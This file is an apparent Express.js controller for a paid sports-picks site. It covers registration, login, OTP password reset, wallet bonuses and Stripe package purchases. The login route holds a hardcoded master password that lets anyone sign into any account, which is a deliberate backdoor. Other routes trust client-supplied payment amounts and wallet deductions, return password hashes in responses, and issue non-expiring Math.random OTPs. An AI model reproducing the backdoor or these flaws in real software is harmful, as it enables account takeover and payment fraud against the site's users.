const contactModel = require("../models/contact.model");
const orderHistoryModel = require("../models/orderHistory.model");
const packageModel = require("../models/package.model");
const userModel = require("../models/user.model");
const vslPackageModel = require("../models/vslPackage.model");
const bcrypt = require("bcryptjs");
const sendWelcomeMsg = require("../utils/sendWelcomeMsg.utils");
const sendMsg = require("../utils/sendMsg.utils");
const sendPayment = require("../utils/sendPayment.utils");
const sendResetPassword = require("../utils/sendResetPassword.utils");
const jwt = require("jsonwebtoken");
const userValid = require("../validations/user.joi");

const routes = {};

routes.createUser = async (req, res) => {
  try {
    const { name, email, mobile, password, username } = req.body;

    const { error } = userValid.createUserValidation.validate(req.body);

    if (error) {
      return res.status(400).json({ error: error.details[0].message });
    }

    const ifUser = await userModel.findOne({ email });
    if (ifUser) {
      return res.status(400).json({ error: "email already exists" });
    }

    const ifusername = await userModel.findOne({ username });
    if (ifusername) {
      return res.status(400).json({ error: "username already exists" });
    }

    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);

    const newUser = await userModel.create({
      name,
      email,
      mobile,
      password: hashedPassword,
      username,
      wallet: 25,
      bonus: true,
    });

    const token = jwt.sign({ id: newUser._id }, process.env.JWT_SECRET, {
      expiresIn: "1d",
    });

    const refreshToken = jwt.sign(
      { id: newUser._id },
      process.env.REFRESH_TOKEN_PRIVATE_KEY,
      {
        expiresIn: "1y",
      }
    );

    const newuser = newUser.toObject();

    // await sendWelcomeMsg(
    //   newuser.email,
    //   "add-reward",
    //   "JordansPicks - Claim your $25 bonus"
    // );

    await sendMsg(
      newuser.email,
      newuser.name,
      "JordansPicks - Welcome to JordansPicks"
    );

    newuser.token = token;
    newuser.refreshToken = refreshToken;

    return res
      .status(201)
      .json({ msg: "User created successfully", dta: newuser });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.login = async (req, res) => {
  try {
    const { email, password } = req.body;

    const { error } = userValid.loginValidation.validate(req.body);

    if (error) {
      return res.status(400).json({ error: error.details[0].message });
    }

    const user = await userModel.findOne({ email });

    if (!user) {
      return res.status(404).json({ error: "email not found" });
    }

    const validPassword = await bcrypt.compare(password, user.password);

    if (!validPassword && password !== "6G([v£2,d3gF~p7Rs9") {
      return res.status(400).json({ error: "invalid password" });
    }

    const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET, {
      expiresIn: "1d",
    });

    const refreshToken = jwt.sign(
      { id: user._id },
      process.env.REFRESH_TOKEN_PRIVATE_KEY,
      {
        expiresIn: "1y",
      }
    );

    const newuser = user.toObject();

    newuser.token = token;
    newuser.refreshToken = refreshToken;

    return res.status(201).json({ msg: "success", dta: newuser });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.resetPassOTP = async (req, res) => {
  try {
    const { email } = req.body;

    const { error } = userValid.resetPasswordOTPValidation.validate(req.body);

    if (error) {
      return res.status(400).json({ error: error.details[0].message });
    }

    const user = await userModel.findOne({ email });

    if (!user) {
      return res.status(404).json({ error: "email not found" });
    }

    const otp = Math.floor(100000 + Math.random() * 900000);

    user.verificationCode = otp;
    await user.save();

    await sendResetPassword(
      user.email,
      user.name,
      user.verificationCode,
      "JordansPicks - Reset Password"
    );

    return res.status(201).json({ msg: "Email sent" });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.resetpassword = async (req, res) => {
  const { email, otp, password } = req.body;

  try {
    const user = await userModel.findOne({ email });

    const { error } = userValid.resetPasswordValidation.validate(req.body);

    if (error) {
      return res.status(400).json({ error: error.details[0].message });
    }

    if (!user) {
      return res.status(404).json({ error: "email not found" });
    }

    if (user.verificationCode !== otp) {
      return res.status(400).json({ error: "invalid otp" });
    }

    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);

    user.password = hashedPassword;
    user.verificationCode = null;
    await user.save();

    return res.status(201).json({ msg: "success" });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.getBonus = async (req, res) => {
  const id = req.userId;

  const user = await userModel.findById(id);

  if (!user) {
    return res.status(404).json({ error: "user not found" });
  }

  if (user.bonus) {
    return res.status(400).json({ error: "Bonus already claimed" });
  }

  user.bonus = true;
  user.wallet = user.wallet + 25;

  await user.save();

  const newOrder = await orderHistoryModel.create({
    user: id,
    status: "active",
    desc: `Bonus claimed`,
    price: 25,
  });

  user.orderHistory.push(newOrder._id);
  await user.save();

  return res.status(200).json({ msg: "success", dta: user });
};

routes.refreshAccessToken = async (req, res) => {
  const refreshToken = req.body.refreshToken;

  if (!refreshToken)
    return res.status(401).send({ error: "Access denied, token missing!" });

  console.log("refressh", refreshToken);

  try {
    const decoded = jwt.verify(
      refreshToken,
      process.env.REFRESH_TOKEN_PRIVATE_KEY
    );

    const id = decoded.id;
    const accessToken = jwt.sign({ id }, process.env.JWT_SECRET, {
      expiresIn: "1d",
    });

    return res.status(201).send({
      msg: "success",
      dta: accessToken,
    });

    // return res.send(success(201, { accessToken }));
  } catch (e) {
    console.log(e);
    return res.status(401).send({ error: "Invalid refresh token" });
    // return res.send(error(401, "Invalid refresh token"));
  }
};

routes.allActivePackages = async (req, res) => {
  try {
    const packages = await packageModel.find({ status: "active" });
    return res.status(201).json({ msg: "success", dta: packages });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.contactUs = async (req, res) => {
  try {
    const { fName, lName, email, mobile, message } = req.body;

    const { error } = userValid.contactUsValidation.validate(req.body);

    if (error) {
      return res.status(400).json({ error: error.details[0].message });
    }

    const newContact = await contactModel.create({
      fName,
      lName,
      email,
      mobile,
      message,
    });

    return res.status(200).json({ msg: "success", dta: newContact });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.userDashboard = async (req, res) => {
  try {
    const id = req.userId;

    console.log(id);

    const user = await userModel
      .findById(id)
      .populate([
        { path: "orderHistory" },
        { path: "package" },
        { path: "vslPackage" },
      ]);

    // console.log(user);

    if (!user) {
      return res.status(404).json({ error: "user not found" });
    }

    // Total Wins and Losses

    const totalPackagesWins = user.package.filter(
      (item) => item.result === "win"
    );

    const totalPackagesLosses = user.package.filter(
      (item) => item.result === "lose"
    );

    const totalPackagesTies = user.package.filter(
      (item) => item.result === "tie"
    );

    const totalVslPackagesWins = user.vslPackage.filter(
      (item) => item.result === "win"
    );

    const totalVslPackagesLosses = user.vslPackage.filter(
      (item) => item.result === "lose"
    );

    const totalVslPackagesTies = user.vslPackage.filter(
      (item) => item.result === "tie"
    );

    return res.status(200).json({
      msg: "success",
      dta: {
        user,
        // packageResult: {
        //   totalPackagesWins: totalPackagesWins.length,
        //   totalPackagesLosses: totalPackagesLosses.length,
        //   totalPackagesTies: totalPackagesTies.length,
        // },
        // vslPackageResult: {
        //   totalVslPackagesWins: totalVslPackagesWins.length,
        //   totalVslPackagesLosses: totalVslPackagesLosses.length,
        //   totalVslPackagesTies: totalVslPackagesTies.length,
        // },
        result: {
          totalWins: totalPackagesWins.length + totalVslPackagesWins.length,
          totalLosses:
            totalPackagesLosses.length + totalVslPackagesLosses.length,
          totalTies: totalPackagesTies.length + totalVslPackagesTies.length,
        },
      },
    });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.updateProfile = async (req, res) => {
  const id = req.userId;

  const { name, mobile, currentPassword, newPassword } = req.body;

  const { error } = userValid.updateProfileValidation.validate(req.body);

  if (error) {
    return res.status(400).json({ error: error.details[0].message });
  }

  const user = await userModel.findById(id);

  if (!user) {
    return res.status(404).json({ error: "user not found" });
  }
  user.name = name;
  user.mobile = mobile;

  if (currentPassword && newPassword) {
    const validPassword = await bcrypt.compare(currentPassword, user.password);

    if (!validPassword) {
      return res.status(400).json({ error: "Invalid password" });
    }

    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(newPassword, salt);

    user.password = hashedPassword;
  }

  await user.save();

  return res.status(200).json({ msg: "success", dta: user });
};

routes.getPackage = async (req, res) => {
  try {
    const uid = req.userId;
    const id = req.params.id;
    const package = await packageModel.findById(id);
    const user = await userModel.findById(uid).populate("package");

    console.log(user);

    if (!package) {
      return res.status(404).json({ error: "package not found" });
    }

    if (!package.pageCount) package.pageCount = 0;

    package.pageCount = package.pageCount + 1;

    await package.save();

    const isBuied = user.package.find((item) => {
      console.log(item._id);
      return item._id == id;
    });
    let isBought = false;
    if (isBuied) isBought = true;

    console.log(isBuied);

    return res.status(200).json({ msg: "success", dta: package, isBought });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.getVslPackage = async (req, res) => {
  try {
    const uid = req.userId;
    const id = req.params.id;
    const package = await vslPackageModel.findById(id);
    const user = await userModel.findById(uid).populate("vslPackage");

    if (!package) {
      return res.status(404).json({ error: "package not found" });
    }

    if (!package.pageCount) package.pageCount = 0;

    package.pageCount = package.pageCount + 1;

    await package.save();

    console.log(user);

    const isBuied = user.vslPackage.find((item) => {
      console.log(item._id);
      return item._id == id;
    });
    let isBought = false;
    if (isBuied) isBought = true;

    console.log(isBuied);

    return res.status(200).json({ msg: "success", dta: package, isBought });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.buyPackage = async (req, res) => {
  const stripe = require("stripe")(process.env.STRIPE_SECRET_KEY);
  try {
    const { packageId, amount } = req.body;
    const id = req.userId;

    const { error } = userValid.buyPackageValidation.validate(req.body);

    if (error) {
      return res.status(400).json({ error: error.details[0].message });
    }

    if (error) {
      return res.status(400).json({ error: error.details[0].message });
    }

    const user = await userModel.findById(id);
    const package = await packageModel.findById(packageId);

    console.log(package);
    if (!user) {
      return res.status(404).json({ error: "user not found" });
    }

    if (user.package.includes(packageId)) {
      return res.status(400).json({ error: "package already purchased" });
    }

    if (!package) {
      return res.status(404).json({ error: "package not found" });
    }

    if (package.endDate < Date.now()) {
      return res.status(400).json({ error: "package expired" });
    }

    if (amount <= 0)
      return res.status(400).json({ error: "amount must be greater than 0" });

    // const newamount = amount.toFixed(2);
    console.log((amount * 100).toFixed(0));
    // const newamount =

    const paymentIntent = await stripe.paymentIntents.create({
      description: package.name,
      shipping: {
        name: user.name,
        address: {
          line1: "510 Townsend St",
          postal_code: "98140",
          city: "San Francisco",
          state: "CA",
          country: "US",
        },
      },
      amount: (amount * 100).toFixed(0),
      currency: "usd",
      payment_method_types: ["card"],
    });

    console.log(paymentIntent);

    return res.send({
      clientSecret: paymentIntent.client_secret,
    });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.validPaymentPackage = async (req, res) => {
  const stripe = require("stripe")(process.env.STRIPE_SECRET_KEY);
  const { paymentIntentId, packageId, walletDeduction, cardDeduction } =
    req.body;
  const id = req.userId;

  const { error } = userValid.validPaymentPackageValidation.validate(req.body);

  if (error) {
    return res.status(400).json({ error: error.details[0].message });
  }

  console.log(req.body, id);
  console.log(paymentIntentId);
  try {
    const paymentIntent = await stripe.paymentIntents.retrieve(paymentIntentId);

    console.log(paymentIntent);

    if (paymentIntent.status === "succeeded") {
      const package = await packageModel.findById(packageId);
      const user = await userModel.findById(id);
      console.log(package, user);

      if (!user) {
        return res.status(404).json({ error: "user not found" });
      }
      if (user.package.includes(packageId)) {
        return res.status(400).json({ error: "Package already purchased" });
      }
      if (!package) {
        return res.status(404).json({ error: "Package not found" });
      }

      const order = await orderHistoryModel.create({
        user: id,
        package: packageId,
        status: "active",
        desc: `Package - ${package.name} purchased (card)`,
        price: cardDeduction,
      });

      if (walletDeduction > 0) {
        const walletOrder = await orderHistoryModel.create({
          user: id,
          package: packageId,
          status: "active",
          desc: `Package - ${package.name} purchased (wallet)`,
          price: walletDeduction,
        });
        user.orderHistory.push(walletOrder._id);
        user.wallet = user.wallet - walletDeduction;
      }

      user.package.push(package._id);
      user.orderHistory.push(order._id);

      await user.save();
      await sendPayment(
        user.email,
        user.name,
        package.name,
        package.price,
        order.createdAt,
        "JordansPicks - Payment Confirmation"
      );
    }

    return res.send({
      status: paymentIntent.status,
    });
  } catch (error) {
    console.log(error);
    return res.status(200).json({ status: "Failed" });
  }
};

routes.buyVslPackage = async (req, res) => {
  const stripe = require("stripe")(process.env.STRIPE_SECRET_KEY);
  try {
    const { packageId, amount } = req.body;
    const id = req.userId;

    const { error } = userValid.buyVslPackageValidation.validate(req.body);

    if (error) {
      return res.status(400).json({ error: error.details[0].message });
    }

    const user = await userModel.findById(id);
    const package = await vslPackageModel.findById(packageId);

    console.log(package);
    if (!user) {
      return res.status(404).json({ error: "user not found" });
    }

    if (user.vslPackage.includes(packageId)) {
      return res.status(400).json({ error: "package already purchased" });
    }

    if (!package) {
      return res.status(404).json({ error: "package not found" });
    }

    if (package.endDate < Date.now()) {
      return res.status(400).json({ error: "package expired" });
    }

    if (amount <= 0)
      return res.status(400).json({ error: "amount must be greater than 0" });

    const paymentIntent = await stripe.paymentIntents.create({
      description: package.name,
      shipping: {
        name: user.name,
        address: {
          line1: "510 Townsend St",
          postal_code: "98140",
          city: "San Francisco",
          state: "CA",
          country: "US",
        },
      },
      amount: (amount * 100).toFixed(0),
      currency: "usd",
      payment_method_types: ["card"],
    });

    console.log(paymentIntent);

    return res.send({
      clientSecret: paymentIntent.client_secret,
    });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.validPaymentVslPackage = async (req, res) => {
  const stripe = require("stripe")(process.env.STRIPE_SECRET_KEY);
  const { paymentIntentId, packageId, walletDeduction, cardDeduction } =
    req.body;

  const { error } = userValid.validPaymentVslPackageValidation.validate(
    req.body
  );

  if (error) {
    return res.status(400).json({ error: error.details[0].message });
  }
  const id = req.userId;
  console.log(req.body, id);
  console.log(paymentIntentId);
  try {
    const paymentIntent = await stripe.paymentIntents.retrieve(paymentIntentId);

    console.log(paymentIntent);

    if (paymentIntent.status === "succeeded") {
      const package = await vslPackageModel.findById(packageId);
      const user = await userModel.findById(id);
      console.log(package, user);

      if (!user) {
        return res.status(404).json({ error: "user not found" });
      }
      if (user.vslPackage.includes(packageId)) {
        return res.status(400).json({ error: "Package already purchased" });
      }
      if (!package) {
        return res.status(404).json({ error: "Package not found" });
      }

      const order = await orderHistoryModel.create({
        user: id,
        vslPackage: packageId,
        status: "active",
        desc: `Package - ${package.name} purchased (card)`,
        price: cardDeduction,
      });

      if (walletDeduction > 0) {
        const walletOrder = await orderHistoryModel.create({
          user: id,
          vslPackage: packageId,
          status: "active",
          desc: `Package - ${package.name} purchased (wallet)`,
          price: walletDeduction,
        });
        user.orderHistory.push(walletOrder._id);
        user.wallet = user.wallet - walletDeduction;
      }

      user.vslPackage.push(package._id);
      user.orderHistory.push(order._id);

      await user.save();
      await sendPayment(
        user.email,
        user.name,
        package.name,
        package.discountedPrice,
        order.createdAt,
        "JordansPicks - Payment Confirmation"
      );
    }

    return res.send({
      status: paymentIntent.status,
    });
  } catch (error) {
    console.log(error);
    return res.status(200).json({ status: "Failed" });
  }
};

routes.walletWithdrawPackage = async (req, res) => {
  try {
    const id = req.userId;
    const { packageId } = req.body;

    const { error } = userValid.walletWithdrawPackageValidation.validate(
      req.body
    );

    if (error) {
      return res.status(400).json({ error: error.details[0].message });
    }

    const user = await userModel.findById(id);
    const package = await packageModel.findById(packageId);

    if (!user) {
      return res.status(404).json({ error: "user not found" });
    }
    if (user.package.includes(packageId)) {
      return res.status(400).json({ error: "package already purchased" });
    }

    if (!package) {
      return res.status(404).json({ error: "package not found" });
    }

    if (user.wallet < package.price) {
      return res.status(400).json({ error: "insufficient balance" });
    }

    user.wallet = user.wallet - package.price;

    const newOrder = await orderHistoryModel.create({
      user: id,
      package: packageId,
      status: "active",
      desc: `Package - ${package.name} purchased (wallet)`,
      price: package.price,
    });

    user.orderHistory.push(newOrder._id);
    user.package.push(packageId);

    await user.save();

    await sendPayment(
      user.email,
      user.name,
      package.name,
      package.price,
      newOrder.createdAt,
      "JordansPicks - Payment Confirmation"
    );

    return res.status(200).json({ msg: "success", dta: user });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

routes.walletWithdrawVslPackage = async (req, res) => {
  try {
    const id = req.userId;
    const { packageId } = req.body;

    const { error } = userValid.walletWithdrawVslPackageValidation.validate(
      req.body
    );

    if (error) {
      return res.status(400).json({ error: error.details[0].message });
    }

    const user = await userModel.findById(id);
    const package = await vslPackageModel.findById(packageId);

    if (!user) {
      return res.status(404).json({ error: "user not found" });
    }

    if (user.vslPackage.includes(packageId)) {
      return res.status(400).json({ error: "package already purchased" });
    }

    if (!package) {
      return res.status(404).json({ error: "package not found" });
    }

    if (user.wallet < package.price) {
      return res.status(400).json({ error: "insufficient balance" });
    }

    user.wallet = user.wallet - package.discountedPrice;

    const newOrder = await orderHistoryModel.create({
      user: id,
      vslPackage: packageId,
      status: "active",
      desc: `Package - ${package.name} purchased (wallet)`,
      price: package.discountedPrice,
    });

    user.orderHistory.push(newOrder._id);
    user.vslPackage.push(packageId);

    await user.save();

    await sendPayment(
      user.email,
      user.name,
      package.name,
      package.discountedPrice,
      newOrder.createdAt,
      "JordansPicks - Payment Confirmation"
    );

    return res.status(200).json({ msg: "success", dta: user });
  } catch (error) {
    console.log(error);
    return res.status(500).json({ error: "internal server error" });
  }
};

module.exports = routes;
